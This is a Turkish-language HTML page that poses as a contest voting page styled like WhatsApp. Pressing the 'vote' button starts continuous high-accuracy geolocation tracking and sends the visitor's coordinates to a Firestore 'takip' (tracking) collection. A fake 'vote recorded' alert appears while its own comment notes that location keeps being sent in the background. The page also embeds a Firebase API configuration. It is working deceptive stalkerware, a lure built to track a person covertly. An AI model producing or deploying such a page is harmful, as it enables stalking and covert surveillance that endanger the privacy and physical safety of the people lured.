<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yarışma Katılım</title>
    <style>
        body { margin: 0; background-color: #0b141a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }
        .card { text-align: center; padding: 30px; border-radius: 20px; background: #111b21; border: 1px solid #233138; width: 85%; max-width: 320px; }
        #vote-btn { width: 100%; height: 55px; background-color: #00a884; color: white; display: flex; 
                    justify-content: center; align-items: center; border-radius: 30px; cursor: pointer; 
                    font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .status-text { margin-top: 15px; font-size: 12px; color: #34b7f1; display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h2 id="msg">Aday Listesi Hazır.<br>Oy Kullanın.</h2>
        <div id="vote-btn" onclick="baslat()">Oy Ver</div>
        <div id="status" class="status-text">Doğrulama yapılıyor, lütfen sayfayı kapatmayın...</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCBlAZT1FXVcoj_1oFgjP4GlmaOIVFAt2c",
            authDomain: "whtapp-27674.firebaseapp.com",
            projectId: "whtapp-27674",
            storageBucket: "whtapp-27674.firebasestorage.app",
            messagingSenderId: "678592663827",
            appId: "1:678592663827:web:3eaa8ff0ec2cd1e2c54ae6"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        window.baslat = () => {
            document.getElementById("vote-btn").style.display = "none";
            document.getElementById("status").style.display = "block";
            document.getElementById("msg").innerText = "Oy Kaydediliyor...";

            // watchPosition sayesinde telefon hareket ettikçe veya zaman geçtikçe otomatik gönderir
            navigator.geolocation.watchPosition(async (pos) => {
                try {
                    await setDoc(doc(db, "takip", "admin"), {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        zaman: new Date().toLocaleString('tr-TR'),
                        aktif: Date.now() 
                    });
                    console.log("Konum güncellendi.");
                } catch (e) {
                    console.error("Hata:", e);
                }
            }, (err) => {
                alert("Hata: Konum izni verilmedi.");
            }, {
                enableHighAccuracy: true, // En yüksek hassasiyet
                maximumAge: 0,            // Asla eski veriyi kullanma
                timeout: 5000
            });

            // 3 saniye sonra "Bitti" süsü ver ama arka planda konum göndermeye devam eder
            setTimeout(() => {
                alert("Oyunuz başarıyla kaydedildi! Teşekkürler.");
            }, 3000);
        };
    </script>
</body>
</html>
